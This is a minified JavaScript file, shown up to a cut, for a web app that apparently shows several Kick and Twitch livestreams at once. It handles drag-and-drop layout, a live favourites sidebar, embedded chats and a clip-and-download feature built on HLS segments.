let timeout2,firststream,index=0,blabla=!1,i=0,fixed=!1;const imageUrl="./clip2.png",imageUrl2="./cliphover.png";function loadTwitchStream(e){const t=document.getElementById("widthSlider"),n=document.getElementById("heightSlider"),i=parseInt(t.value),l=parseInt(n.value),a=document.getElementById("videoContainer"),o=document.createElement("div");o.className="twitch-container",o.style.zIndex="99",o.setAttribute("draggable","true"),o.style.position="relative",o.setAttribute("data-index",index);const s=new Twitch.Embed("twitch-player-container",{width:i,height:l,channel:e,layout:"video",parent:["kickmultistream.github.io","localhost"]}),r=document.createElement("button");r.className="close-button",r.innerText="X",r.style.fontSize="30px",r.style.visibility="hidden",r.style.zIndex="999",r.title="Close The Stream",r.addEventListener("click",(()=>{s.getPlayer().pause(),a.removeChild(o);let t=e+"twitchat";document.getElementById(t).remove()}));const d=document.createElement("div");let c;d.className="twitch-player",d.appendChild(s._iframe),d.appendChild(r),setTimeout((()=>{r.style.visibility="hidden"}),3e3),d.addEventListener("touchstart",(()=>{r.style.visibility="visible",clearTimeout(c),c=setTimeout((()=>{r.style.visibility="hidden"}),3e3)})),d.addEventListener("mouseenter",(()=>{r.style.visibility="visible"})),d.addEventListener("mouseleave",(()=>{r.style.visibility="hidden"})),o.appendChild(d),a.appendChild(o),enableDragAndDropSwap()}function loadTwitchStreamFromPrompt(){let e=prompt("enter the Twitch channel name \nor provide a link to the channel in this format:\nhttps://www.twitch.tv/example");if(e){e=e.replace(/^https:\/\/(?:www\.|m\.)?twitch\.tv\//,"").replace(/\//g,"");const t=document.querySelector(".logo-container");"none"!==t.style.display&&(t.style.display="none");"Disable Chat"===document.getElementById("chatenable").textContent?(loadTwitchStream(e),addtwitchChat(e),resizechatsto270()):loadTwitchStream(e)}}const loadTwitchStreamButton=document.getElementById("loadTwitchStreamButton");loadTwitchStreamButton.addEventListener("click",loadTwitchStreamFromPrompt);const sizeslider=document.getElementById("widthSlider");sizeslider.style.visibility="hidden";const selectbutton=document.getElementById("selectButton");function handleEnableChatState(){const e=document.getElementById("chatenable").textContent;localStorage.setItem("buttonvalue",e)}function loadEnableChatState(){const e=document.getElementById("chatenable"),t=localStorage.getItem("buttonvalue");null!==t&&(e.textContent=t)}selectbutton.onclick=function(){const e=document.getElementById("widthValue");if("hidden"===sizeslider.style.visibility){sizeslider.style.visibility="visible",e.style.visibility="visible";document.getElementById("button-container");let t=!1;t||(t=!0)}else sizeslider.style.visibility="hidden",e.style.visibility="hidden"},loadEnableChatState();const enablechat=document.getElementById("chatenable");function resizeVideoPlayer(e,t,n){if(e){e.style.width=t+"px",e.style.height=n+"px";videojs(e.id).dimensions(t,n)}}enablechat.onclick=function(){"Disable Chat"===enablechat.textContent?(enablechat.textContent="Enable Chat",hideAllChats(),handleEnableChatState()):(enablechat.textContent="Disable Chat",handleEnableChatState())};const parentContainer=document.querySelector(".video-container");function enableDragAndDropSwap(){parentContainer.querySelectorAll(".videowrapper,.twitch-container").forEach((e=>{e.setAttribute("draggable","true"),e.addEventListener("dragstart",dragStart),e.addEventListener("dragover",dragOver),e.addEventListener("drop",dragDrop),e.addEventListener("dragend",dragEnd),e.setAttribute("data-index",index),index++}))}let dragStartIndex,dragOverIndex;function dragStart(e){dragStartIndex=parseInt(this.getAttribute("data-index")),e.dataTransfer.effectAllowed="move",e.dataTransfer.setData("text/plain",""),document.querySelectorAll(".dragdiv").forEach((e=>{e&&(e.style.display="block")}))}function dragOver(e){e.preventDefault(),e.dataTransfer.dropEffect="move",dragOverIndex=parseInt(this.getAttribute("data-index"))}function dragDrop(e){e.preventDefault();const t=parentContainer.querySelector(`[data-index="${dragStartIndex}"]`),n=parentContainer.querySelector(`[data-index="${dragOverIndex}"]`);let i=t.querySelector("iframe"),l=n.querySelector("iframe");if(i.id.includes("kick")||l.id.includes("kick")){let e=i.id.replace("kick",""),a=l.id.replace("kick","");(async()=>{try{if(i.id.includes("kick")){const t=await fetch(`https://kick.com/api/v2/channels/${e}/livestream`),n=await t.json();if(n&&n.data&&n.data.session_title){const t=n.data.session_title,l=n.data.created_at,a=`https://api.codetabs.com/v1/proxy/?quest=${n.data.playback_url}`;i.src=`./embedplayer.html#src=${a}&username=${e}&created_at=${l}&title=${t}`}}if(l.id.includes("kick")){const e=await fetch(`https://kick.com/api/v2/channels/${a}/livestream`),t=await e.json();if(t&&t.data&&t.data.session_title){const e=t.data.session_title,n=t.data.created_at,i=`https://api.codetabs.com/v1/proxy/?quest=${t.data.playback_url}`;l.src=`./embedplayer.html#src=${i}&username=${a}&created_at=${n}&title=${e}`}}if(null!==t&&null!==n&&t!==n){const e=t.nextSibling,i=n.nextSibling;parentContainer.insertBefore(n,e),parentContainer.insertBefore(t,i)}}catch(e){console.error("Error:",e)}})()}else if(null!==t&&null!==n&&t!==n){const e=t.nextSibling,i=n.nextSibling;parentContainer.insertBefore(n,e),parentContainer.insertBefore(t,i)}}function dragEnd(){enableDragAndDropSwap(),document.querySelectorAll(".dragdiv").forEach((e=>{e&&(e.style.display="none")}))}document.addEventListener("DOMContentLoaded",(function(){document.getElementById("resizeButton").onclick=function(){document.querySelectorAll(".videowrapper").forEach((e=>{const t=e.querySelector("iframe");t&&(t.style.width="378px",t.style.height="216px")})),document.querySelectorAll(".twitch-container").forEach((e=>{const t=e.querySelector("iframe");t&&(t.style.width="378px",t.style.height="216px")}));const e=document.getElementById("widthSlider");e.value=378,document.getElementById("widthValue").textContent=e.value,document.getElementById("heightSlider").value=216;const t=document.querySelectorAll(".chatwrapper");t.length>4&&t.length<7?t.forEach((e=>{const t=e.querySelector(".chatiframe");t&&(t.style.width="290px")})):t.length>6&&t.length<10?t.forEach((e=>{const t=e.querySelector(".chatiframe");t&&(t.style.width="194px")})):t.length>9?t.forEach((e=>{const t=e.querySelector(".chatiframe");t&&(t.style.width="175px")})):t.forEach((e=>{const t=e.querySelector(".chatiframe");if(t){const e=document.getElementById("widthSlider").value;t.style.width=e+"px"}}))};const e=document.getElementById("widthSlider"),t=document.getElementById("heightSlider");e.addEventListener("input",(function(){const n=parseInt(e.value),i=Math.floor(n/1.75);t.value=i,function(){const e=document.getElementById("widthValue"),t=(document.getElementById("heightValue"),document.getElementById("widthSlider"));document.getElementById("heightSlider"),e.textContent=t.value,e.style.color="white",e.style.fontSize="12px"}(),function(){const e=document.getElementById("widthSlider"),t=document.getElementById("heightSlider"),n=parseInt(e.value),i=parseInt(t.value);isNaN(n)||isNaN(i)||(document.querySelectorAll(".videowrapper").forEach((e=>{const t=e.querySelector("iframe");t&&(t.style.width=n+"px",t.style.height=i+"px")})),document.querySelectorAll(".twitch-container").forEach((e=>{const t=e.querySelector("iframe");t&&(t.style.width=n+"px",t.style.height=i+"px")})),document.querySelectorAll(".chatwrapper").forEach((e=>{e.querySelector(".chatiframe")&&resizechatsto270()})))}()}));const n=document.getElementById("Focusmode");n.onclick=function(){!function(){const e=document.getElementById("button-container");document.getElementById("slidebar"),"hidden"===e.style.visibility?(e.style.visibility="visible",n.textContent="Focus Mode",sidebar.classList.remove("hidden")):(e.style.visibility="hidden",n.textContent="",sidebar.classList.add("hidden"))}(),"hidden"===document.getElementById("button-container").style.visibility?(n.innerHTML="Normal Mode",n.title="Back To Normal Mode"):(n.innerHTML=' Focus Mode <img src="./focus.png" alt="Focus Mode" width="10" height="10"/>',n.style.marginLeft="0px",n.title="Enter Focus Mode"),n.style.visibility="visible"}}));const focusModeButton=document.getElementById("Focusmode");async function fetchUserData(e){const t=`https://kick.com/api/v2/channels/${e}/livestream`;try{const e=await fetch(t);return await e.json()}catch(t){return console.error(`Error fetching data for ${e}:`,t),null}}function toggleSidebar(){const e=document.getElementById("sidebar");e.classList.toggle("hidden");const t=document.getElementById("display-sidebar");e.classList.contains("hidden")?t.style.visibility="visible":(updateOnlineUsers(),t.style.visibility="hidden")}focusModeButton.addEventListener("click",(function(){focusModeButton.classList.toggle("dimmed")}));let usernames=JSON.parse(localStorage.getItem("usernames"))||["iceposeidon","Sam","Suspendas","officialebz","fousey","adinross","hyubsama","burgerplanet","hanridge","kangjoel","slightlyhomeless","cristravels","garydavid","sampanday","deepak","bongbong_irl","therealmoisesb","shotime","xqc","bennymack","xenathewitch","Eddie","nedx","johnwhatsgoingon","Harrisonirl","Slykane"];function saveUsernamesToLocalStorage(){localStorage.setItem("usernames",JSON.stringify(usernames))}const addUsernameButton=document.getElementById("addUsernameButton");addUsernameButton.addEventListener("click",(()=>{const e=prompt("enter the channel you'd like to add to your favorites:\n(it will be shown on the live list if it's live) ");if(e){const t=e.toLowerCase();usernames.some((e=>e.toLowerCase()===t))?alert("Channel already exists!"):(usernames.push(e),saveUsernamesToLocalStorage(),blabla=!1,updateOnlineUsers())}}));const removeUsernameButton=document.getElementById("removeUsernameButton");removeUsernameButton.addEventListener("click",(()=>{const e=prompt("provide the name of the channel you wish to remove from the list:");if(e){const t=e.toLowerCase();usernames=usernames.filter((e=>e.toLowerCase()!==t)),saveUsernamesToLocalStorage(),blabla=!1,updateOnlineUsers()}}));const usernameManagement=document.getElementById("usernameManagement"),usernameButtons=document.getElementById("usernameButtons");usernameButtons.style.display="none",usernameManagement.addEventListener("click",(()=>{"none"!==usernameButtons.style.display&&usernameButtons.style.display?usernameButtons.style.display="none":usernameButtons.style.display="block"}));const watchform=document.getElementById("watch-form");usernameButtons.addEventListener("mouseleave",(()=>{usernameButtons.style.display="none"}));const WatchAnotherChannel=document.getElementById("WatchAnotherChannel"),WatchAnotherChannel2=document.getElementById("WatchAnotherChannel2");WatchAnotherChannel2.style.display="none",WatchAnotherChannel.addEventListener("click",(()=>{"none"!==WatchAnotherChannel2.style.display&&WatchAnotherChannel2.style.display?WatchAnotherChannel2.style.display="none":WatchAnotherChannel2.style.display="block"}));const showFavoritesButton=document.getElementById("showfavorites");async function updateOnlineUsers(){if(!document.getElementById("sidebar").classList.contains("hidden")&&!blabla){blabla=!0,clearTimeout(timeout2),timeout2=setTimeout((()=>{blabla=!1}),1e4),console.log("sidebar online list updated successfully");const e=document.getElementById("onlineUsersList"),t=usernames.map((e=>fetchUserData(e))),n=(await Promise.all(t)).map(((e,t)=>({username:usernames[t],src:e?.data?.playback_url,viewers:e?.data?.viewers||0,session_title:e?.data?.session_title||"",created_at:e?.data?.created_at}))).filter((e=>e.viewers>0)).sort(((e,t)=>t.viewers-e.viewers));e.innerHTML="",n.forEach((t=>{const n=document.createElement("li");n.style.marginTop="10px",n.classList.add("flex-list");const l=document.createElement("span");l.textContent=t.username,l.style.marginLeft="5px";const a=document.createElement("span"),o=document.createElement("viewercount2");o.textContent=" "+t.viewers;const s=document.createElement("img");s.src="./dot.png",s.style.width="10px",s.style.height="10px",a.appendChild(s),a.appendChild(o),n.appendChild(l),n.appendChild(a),n.title=t.session_title;const r=t.username+"title",d=document.getElementById(r);d&&(d.innerText=t.session_title);const c=`https://api.codetabs.com/v1/proxy/?quest=${t.src}`;n.onclick=()=>{const e=document.getElementById("chatenable").textContent;let n;function l(){const e=document.querySelector(".logo-container");"none"!==e.style.display&&(e.style.display="none");const n=document.getElementById("widthSlider"),l=document.getElementById("heightSlider");i++;let a=i;const o=document.createElement("div");o.style.position="relative",1===i&&(firststream=t.username),o.className="videowrapper",o.id="videowrapper",o.setAttribute("draggable","true"),o.style.zIndex="666666",o.width=`${parseInt(n.value)}px`,o.height=`${parseInt(l.value)}px`;var s=document.createElement("div");s.style.background="linear-gradient(360deg, rgba(16, 16, 16, 0.1) 0%, rgba(16, 16, 16, 1) 100%)",s.style.position="absolute",s.style.top="0%",s.style.left="0%",s.style.width="100%",s.style.height="75px";var d=document.createElement("div");d.style.background="transparent",d.style.position="absolute",d.style.top="76px",d.style.left="30%",d.style.width="40%",d.style.height="40%",d.id="touchstartdiv";var u=document.createElement("span");u.innerText=t.username,u.style.position="absolute",u.style.top="0%",u.style.color="white",u.style.fontFamily="Roboto, sans-serif",u.style.fontWeight="bold",u.style.padding="5px",u.style.fontSize="21px",u.style.textDecoration="underline",u.style.cursor="pointer",u.title="Refresh The Stream";var m=document.createElement("img");m.src="./refresh.png",m.alt="Refresh Stream",m.style.verticalAlign="middle",m.style.width="21px",m.style.height="21px",u.appendChild(m);var h=document.createElement("span");h.id=t.username+"title",h.innerText=t.session_title,h.style.position="absolute",h.style.marginTop="5px",h.style.top="30px",h.style.color="white",h.style.fontWeight="bold",h.style.fontFamily="Roboto, sans-serif",h.style.padding="5px",h.style.fontSize="12px";var y=document.createElement("button");y.style.backgroundImage=`url(${imageUrl})`,y.style.backgroundSize="18px",y.style.backgroundColor="transparent",y.style.backgroundPosition="center",y.style.backgroundRepeat="no-repeat",y.style.width="32px",y.style.height="20px",y.style.borderRadius="0",y.style.border="32",y.style.position="absolute",y.style.top="10px",y.style.left="75%",y.title="Clip it and ship it",y.onclick=()=>{(async()=>{try{const e=await fetch(`https://kick.com/api/v2/channels/${t.username}/livestream`),n=await e.json();if(n&&n.data&&n.data.session_title){let e=`https://api.codetabs.com/v1/proxy/?quest=${n.data.playback_url}`;fetch(e).then((e=>e.text())).then((e=>{const t=e.split("\n");let n=null;for(let e=0;e<t.length;e++)if(t[e].includes('GROUP-ID="720p60"')||t[e].includes('GROUP-ID="720p30"')){n=t[e+2];break}n?(console.log("Found target variant URL:",n),getSegmentUrls(n).then((e=>{validSegments.length=0,validSegments.push(...e),playSegments(validSegments)})).catch((e=>{console.error("Error fetching segments:",e)}))):console.error("Desired quality variant not found.")})).catch((e=>{console.error("Error fetching or parsing manifest:",e)}))}else console.error("Livestream data is not available or session title is missing.")}catch(e){console.error("Error:",e)}})()},y.addEventListener("mouseenter",(function(){y.style.backgroundImage=`url(${imageUrl2})`})),y.addEventListener("mouseleave",(function(){y.style.backgroundImage=`url(${imageUrl})`})),s.appendChild(y);var p=document.createElement("iframe");p.id="kick"+t.username,p.src=`./embedplayer.html#src=${c}&username=${t.username}&created_at=${t.created_at}&title=${t.session_title}`;p.setAttribute("sandbox","allow-scripts allow-forms allow-same-origin"),p.setAttribute("draggable","true");const g=parseInt(n.value),v=parseInt(l.value);p.width=`${g}px`,p.height=`${v}px`,p.frameborder="0",p.style.border="none",p.allowfullscreen=!0;const b=document.createElement("button");b.className="close-button",b.innerText="X",b.title="Close The Stream",b.style.position="absolute",b.style.top="0",b.style.left="90%",b.style.color="white",b.style.fontSize="30px",b.addEventListener("click",(()=>{let e=t.username+"chat";document.getElementById(e)?.remove();if(1!==a||/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent))videoContainer.removeChild(o);else{o.className="videowrapperr";let e="kick"+t.username;document.getElementById(e).style.width="1px",document.getElementById(e).style.height="1px",document.getElementById(e).contentWindow.postMessage("pauseVideo","*")}})),u.onclick=function(){(async()=>{try{const n=await fetch(`https://kick.com/api/v2/channels/${t.username}/livestream`);if(!n.ok)throw new Error(`HTTP error! Status: ${n.status}`);const i=await n.json();if(i&&i.data&&i.data.session_title){const n=`https://api.codetabs.com/v1/proxy/?quest=${i.data.playback_url}`,l=i?.data.session_title,a=i?.data.created_at;let s="./embedplayer.html#src="+n+"&username="+t.username+"&created_at="+a+"&title="+l;var e=document.createElement("iframe");e.id="kick"+t.username,e.src=s;e.setAttribute("sandbox","allow-scripts allow-forms allow-same-origin"),e.setAttribute("draggable","true");const d=document.getElementById("widthSlider"),c=document.getElementById("heightSlider"),u=parseInt(d.value),m=parseInt(c.value);e.width=`${u}px`,e.height=`${m}px`,e.frameborder="0",e.style.border="none",e.allowfullscreen=!0,o.querySelector("iframe").remove(),o.appendChild(e);t.username;const h=document.getElementById(r);h&&(h.innerText=l)}else alert("Channel is Offline")}catch(e){return console.error(`Error fetching data for ${t.username}:`,e),null}})()},s.appendChild(b),s.appendChild(h),o.appendChild(p),document.getElementById("videoContainer").appendChild(o),s.appendChild(u),o.appendChild(s);let f;/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)&&o.appendChild(d),f=setTimeout((()=>{b.style.visibility="hidden",y.style.visibility="hidden",s.style.visibility="hidden",u.style.visibility="hidden"}),3e3),d.addEventListener("touchstart",(()=>{b.style.visibility="visible",y.style.visibility="visible",s.style.visibility="visible",u.style.visibility="visible",clearTimeout(f),f=setTimeout((()=>{b.style.visibility="hidden",y.style.visibility="hidden",s.style.visibility="hidden",u.style.visibility="hidden"}),3e3)})),o.addEventListener("mouseenter",(()=>{b.style.visibility="visible",y.style.visibility="visible",s.style.visibility="visible",u.style.visibility="visible",clearTimeout(f)})),o.addEventListener("mouseleave",(()=>{b.style.visibility="hidden",y.style.visibility="hidden",s.style.visibility="hidden",u.style.visibility="hidden"})),setTimeout((()=>{enableDragAndDropSwap()}),100),resizechatsto270()}n=firststream===t.username?"nopeeeee":"kick"+t.username,"Disable Chat"!==e||document.getElementById(n)?document.getElementById(n)||l():(addChat(t.username),l())},e.appendChild(n)}))}}function handleFormSubmit(){var e=document.getElementById("username");if(username=e.value.trim(),username){username=username.replace(/^https:\/\/(?:www\.|m\.)?kick\.com\//,"").replace(/\//g,""),(e=document.getElementById("username")).value="";document.getElementById("WatchAnotherChannel2").style.display="none",(async()=>{try{const t=await fetch(`https://kick.com/api/v2/channels/${username}/livestream`),n=await t.json();if(n&&n.data&&n.data.session_title){const l=n.data.session_title,a=n.data.created_at,o=`https://api.codetabs.com/v1/proxy/?quest=${n.data.playback_url}`,s=document.getElementById("chatenable").textContent;let r;function e(){const e=document.querySelector(".logo-container");"none"!==e.style.display&&(e.style.display="none");const t=document.getElementById("widthSlider"),n=document.getElementById("heightSlider");i++;let s=i;const r=document.createElement("div");r.style.position="relative",1===i&&(firststream=username),r.className="videowrapper",r.id="videowrapper",r.setAttribute("draggable","true");var d=document.createElement("div");d.style.background="linear-gradient(360deg, rgba(16, 16, 16, 0.1) 0%, rgba(16, 16, 16, 1) 100%)",d.style.position="absolute",d.style.top="0%",d.style.left="0%",d.style.width="100%",d.style.height="75px";var c=document.createElement("div");c.style.background="transparent",c.style.position="absolute",c.style.top="76px",c.style.left="30%",c.style.width="40%",c.style.height="40%",c.id="touchstartdiv";var u=document.createElement("span");u.innerText=username,u.style.position="absolute",u.style.top="0%",u.style.color="white",u.style.fontFamily="Roboto, sans-serif",u.style.fontWeight="bold",u.style.padding="5px",u.style.fontSize="21px",u.style.textDecoration="underline",u.style.cursor="pointer",u.title="Refresh The Stream",u.onclick=function(){(async()=>{try{const t=await fetch(`https://kick.com/api/v2/channels/${username}/livestream`);if(!t.ok)throw new Error(`HTTP error! Status: ${t.status}`);const n=await t.json();if(n&&n.data&&n.data.session_title){const t=`https://api.codetabs.com/v1/proxy/?quest=${n.data.playback_url}`,i=n?.data.session_title,l=n?.data.created_at;let a="./embedplayer.html#src="+t+"&username="+username+"&created_at="+l+"&title="+i;var e=document.createElement("iframe");e.id="kick"+username,e.src=a;e.setAttribute("sandbox","allow-scripts allow-forms allow-same-origin"),e.setAttribute("draggable","true");const o=document.getElementById("widthSlider"),s=document.getElementById("heightSlider"),d=parseInt(o.value),c=parseInt(s.value);e.width=`${d}px`,e.height=`${c}px`,e.frameborder="0",e.style.border="none",e.allowfullscreen=!0,r.querySelector("iframe").remove(),r.appendChild(e);username;const u=document.getElementById(spanid);u&&(u.innerText=i)}else alert("Channel is Offline")}catch(e){return console.error(`Error fetching data for ${username}:`,e),null}})()};var m=document.createElement("img");m.src="./refresh.png",m.alt="Refresh Stream",m.style.verticalAlign="middle",m.style.width="21px",m.style.height="21px",u.appendChild(m);var h=document.createElement("span");h.id=username+"title",h.innerText=l,h.style.position="absolute",h.style.marginTop="5px",h.style.top="30px",h.style.color="white",h.style.fontWeight="bold",h.style.fontFamily="Roboto, sans-serif",h.style.padding="5px",h.style.fontSize="12px";var y=document.createElement("button");y.style.backgroundImage=`url(${imageUrl})`,y.style.backgroundSize="18px",y.style.backgroundColor="transparent",y.style.backgroundPosition="center",y.style.backgroundRepeat="no-repeat",y.style.width="32px",y.style.height="20px",y.style.borderRadius="0",y.style.border="32",y.style.position="absolute",y.style.top="10px",y.style.left="75%",y.title="Clip it and ship it",y.onclick=()=>{(async()=>{try{const e=await fetch(`https://kick.com/api/v2/channels/${username}/livestream`),t=await e.json();if(t&&t.data&&t.data.session_title){let e=`https://api.codetabs.com/v1/proxy/?quest=${t.data.playback_url}`;fetch(e).then((e=>e.text())).then((e=>{const t=e.split("\n");let n=null;for(let e=0;e<t.length;e++)if(t[e].includes('GROUP-ID="720p60"')||t[e].includes('GROUP-ID="720p30"')){n=t[e+2];break}n?getSegmentUrls(n).then((e=>{validSegments.length=0,validSegments.push(...e),playSegments(validSegments)})):console.error("Desired quality variant not found.")})).catch((e=>{console.error("Error fetching or parsing manifest:",e)}))}}catch(e){console.error("Error:",e)}})()},y.addEventListener("mouseenter",(function(){y.style.backgroundImage=`url(${imageUrl2})`})),y.addEventListener("mouseleave",(function(){y.style.backgroundImage=`url(${imageUrl})`})),d.appendChild(y),d.appendChild(u);var p=document.createElement("iframe");p.id="kick"+username,p.src=`./embedplayer.html#src=${o}&username=${username}&created_at=${a}&title=${l}`;p.setAttribute("sandbox","allow-scripts allow-forms allow-same-origin"),index++,p.setAttribute("draggable","true");const g=parseInt(t.value),v=parseInt(n.value);p.width=`${g}px`,p.height=`${v}px`,p.frameborder="0",p.style.border="none",p.allowfullscreen=!0;const b=document.createElement("button");b.className="close-button",b.innerText="X",b.title="Close The Stream",b.style.position="absolute",b.style.top="0",b.style.left="90%",b.style.color="white",b.style.fontSize="30px";let f=username;b.addEventListener("click",(()=>{document.getElementById(f+"chat")?.remove();if(1!==s||/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent))videoContainer.removeChild(r);else{r.className="videowrapperr";let e="kick"+f;document.getElementById(e).style.width="1px",document.getElementById(e).style.height="1px",r.querySelector(p).contentWindow.postMessage("pauseVideo","*").contentWindow.postMessage("pauseVideo","*")}})),d.appendChild(b),d.appendChild(h),r.appendChild(p),document.getElementById("videoContainer").appendChild(r),setTimeout((()=>{enableDragAndDropSwap()}),100),r.appendChild(d);let w;/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)&&r.appendChild(c),w=setTimeout((()=>{b.style.visibility="hidden",y.style.visibility="hidden",d.style.visibility="hidden",u.style.visibility="hidden"}),3e3),c.addEventListener("touchstart",(()=>{b.style.visibility="visible",y.style.visibility="visible",d.style.visibility="visible",u.style.visibility="visible",clearTimeout(w),w=setTimeout((()=>{b.style.visibility="hidden",y.style.visibility="hidden",d.style.visibility="hidden",u.style.visibility="hidden"}),3e3)})),r.addEventListener("mouseenter",(()=>{b.style.visibility="visible",y.style.visibility="visible",d.style.visibility="visible",u.style.visibility="visible"})),r.addEventListener("mouseleave",(()=>{b.style.visibility="hidden",y.style.visibility="hidden",d.style.visibility="hidden",u.style.visibility="hidden"})),resizechatsto270()}r=firststream===username?"nopeeeee":"kick"+username,"Disable Chat"!==s||document.getElementById(r)?document.getElementById(r)||e():(addChat(username),e())}else alert("Channel is Offline")}catch(d){console.error("Error:",d)}})()}}showFavoritesButton.addEventListener("click",(()=>{const e=usernames.join(", ");alert(`${e}`)})),document.addEventListener("DOMContentLoaded",(()=>{updateOnlineUsers(),setInterval(updateOnlineUsers,9e4)}));const Button=videojs.getComponent("Button"),MyButton=videojs.extend(Button,{constructor:function(e,t){Button.call(this,e,t),this.addClass("my-close-button"),this.on("click",this.handleClick)},buildCSSClass:function(){return"vjs-icon-close"},handleClick:function(){}});function playSegments(e){const t=e.map((e=>e.replace("#EXT-X-PREFETCH:","")));if(0===t.length)return void console.error("No valid segment URLs found.");createClipPlayerWithThrottle(generateM3U8Playlist(t))}function getSegmentUrls(e){return fetch(e).then((e=>e.text())).then((e=>{const t=e.split("\n"),n=[];for(const e of t)e.trim().endsWith(".ts")&&n.push(e.trim());return n})).catch((e=>(console.error("Error fetching or parsing segment URLs:",e),[])))}function generateM3U8Playlist(e){const t=`#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n${e.map((e=>`#EXTINF:2.000,\n${e}`)).join("\n")}\n#EXT-X-ENDLIST`,n=new Blob([t],{type:"application/vnd.apple.mpegurl"});return URL.createObjectURL(n)}videojs.registerComponent("MyButton",MyButton);const validSegments=[];let timer,clipPlayerPending=!1;function createClipPlayerWithThrottle(e){clipPlayerPending||(clipPlayerPending=!0,setTimeout((()=>{clipPlayerPending=!1}),4e3),createClipPlayer(e))}function createClipPlayer(e){const t="player-"+Date.now(),n=Date.now();index++;const i=document.createElement("video");i.id=t,i.className="video-js vjs-default-skin vjs-event-skin",i.setAttribute("controls",""),i.setAttribute("preload","auto"),i.setAttribute("playsinline",""),i.setAttribute("autoplay","true"),i.setAttribute("data-index",index);const l=document.getElementById("videoContainer"),a=document.createElement("div");a.style.position="relative",a.className="clipwrapper";const o=document.createElement("div");o.className="clip-container",o.id="clipcontainer",o.appendChild(i);const s=document.createElement("div");s.className="clip-slider",s.id=n;const r=document.getElementById("widthSlider");r.value<337?s.style.width="150px":s.style.width="250px",s.style.position="absolute",s.style.top="65%",s.style.right="15%",s.style.zIndex="100";var d=document.createElement("span");d.innerText="Cut the clip as needed, then click Download again. Each step on this slider represents 10% of the entire clip",d.style.position="absolute",d.style.top="30%",d.style.right="1%",d.style.backgroundColor="#0A0E0F",d.style.textShadow="1px 1px 2px rgba(0, 0, 0, 0.5), -1px -1px 2px rgba(0, 0, 0, 0.5)",d.style.color="white",d.style.fontWeight="bold",d.style.padding="5px",d.style.visibility="hidden",r.value<337&&(d.style.fontSize="12px"),a.appendChild(o),a.appendChild(d),a.appendChild(s),l.appendChild(a);const c=parseInt(r.value),u=parseInt(heightSlider.value),m=videojs(t,{techOrder:["html5"],plugins:{persistvolume:{namespace:"So-Viral-So-Hot"}},controlBar:{volumePanel:{inline:!1},children:["playToggle","volumePanel","fullscreenToggle","currentTimeDisplay","timeDivider","durationDisplay","progressControl"]},width:c,height:u,liveui:!1}).ready((function(){const t=this;t.src({src:e,type:"application/x-mpegURL"});const l=videojs.extend(Button,{constructor:function(e,t){Button.call(this,e,t),this.controlText(t&&t.controlText||"My Button 2"),this.addClass("my-download-button"),this.isclicked=!1,this.downloadExecuted=!1,this.downloadExecuted2=!1,this.on("click",(()=>{this.isclicked||(this.isclicked=!0,this.downloadu(),setTimeout((()=>{this.isclicked=!1}),1e3))})),this.on("touchstart",(()=>{this.downloadu()}))},buildCSSClass:function(){return"vjs-icon-clip"},downloadu:function(){if(this.downloadExecuted){if(!this.downloadExecuted2){alert("Your clip is being generated.\n");const t=document.getElementById(n);fetch(e).then((e=>e.text())).then((e=>{const i=e.split("\n").filter((e=>e.trim().startsWith("https"))),l=parseInt(t.noUiSlider.get()[0]),a=parseInt(t.noUiSlider.get()[1]),o=Math.ceil(i.length/10),s=l*o,r=Math.min((a+1)*o,i.length),d=i.slice(s,r);!function e(t,i){t>=d.length?function(e){const t=new Blob([e],{type:"video/mp2t"}),i=window.URL.createObjectURL(t),l=document.createElement("a");l.style.display="none",l.href=i,l.download="clip"+n+".ts",document.body.appendChild(l),l.click(),window.URL.revokeObjectURL(i),e=new Uint8Array(0)}(i):fetch(d[t]).then((e=>e.arrayBuffer())).then((n=>{const l=new Uint8Array(i.length+n.byteLength);l.set(i,0),l.set(new Uint8Array(n),i.length),e(t+1,l)})).catch((e=>{console.error("Error fetching .ts file:",e)}))}(0,new Uint8Array(0))})).catch((e=>{console.error("Error fetching playlist:",e)})),this.downloadExecuted2=!0,d.style.visibility="hidden",t.style.visibility="hidden"}}else{d.style.visibility="visible";const e=document.getElementById(n);noUiSlider.create(e,{start:[0,10],connect:!0,step:1,range:{min:0,max:10}}),this.downloadExecuted=!0}}});videojs.registerComponent("MyButton2",l);const o=new l(t,{controlText:"Download clip"});t.controlBar.addChild(o,{componentClass:"my-download-button"},10);const s=document.getElementById("videoContainer");t.play(),t.on("error",(function(){s.removeChild(a),t.dispose();const e=document.createElement("p");e.textContent="Please try again",e.style.color="grey",e.style.textAlign="center",e.style.fontWeight="bold",e.style.fontSize="30px",e.style.fontFamily="Arial, sans-serif",s.appendChild(e),setTimeout((function(){s.removeChild(e),i.style.display="none"}),1e3)}));const r=new MyButton(t,{controlText:"Close"});t.controlBar.addChild(r,{componentClass:"my-close-button"},2),r.on("click",(function(){t.dispose(),s.removeChild(a)})),r.on("touchstart",(function(){t.dispose(),s.removeChild(a)}))}));return m}function resizechatsto270(){const e=document.querySelectorAll(".chatwrapper");e.length>4&&e.length<7?e.forEach((e=>{const t=e.querySelector(".chatiframe");t&&(t.style.width="270px")})):e.length>6&&e.length<10?e.forEach((e=>{const t=e.querySelector(".chatiframe");t&&(t.style.width="194px")})):e.length>9?e.forEach((e=>{const t=e.querySelector(".chatiframe");t&&(t.style.width="175px")})):e.forEach((e=>{const t=e.querySelector(".chatiframe");if(t){const e=document.getElementById("widthSlider").value;t.style.width=e+"px"}}))}function addChat(e){var t=document.getElementById("chat-container");if(t.querySelector(`iframe[title="${e}"]`))return!1;{var n=document.createElement("div");n.style.position="relative",n.className="chatwrapper",n.id=e+"chat";var i=document.createElement("iframe");i.title=e,i.frameBorder="0",i.style.border="none",i.className="chatiframe";const o=document.getElementById("widthSlider"),s=parseInt(o.value);i.width=s,i.height="400px",i.src="https://sp0kzz.github.io/kickchat/?user="+e+"&animate=true&badges=true&commands=true&bots=true&textsize=15px&cache=true&hash=b6ead8085ba3f33370cfe31d85dfa78d";var l=document.createElement("span");l.innerText=e,l.style.position="absolute",l.style.top="0",l.style.left="50%",l.style.transform="translateX(-50%)",l.style.backgroundColor="#0A0E0F",l.style.color="grey",l.style.fontWeight="bold",l.style.padding="5px";var 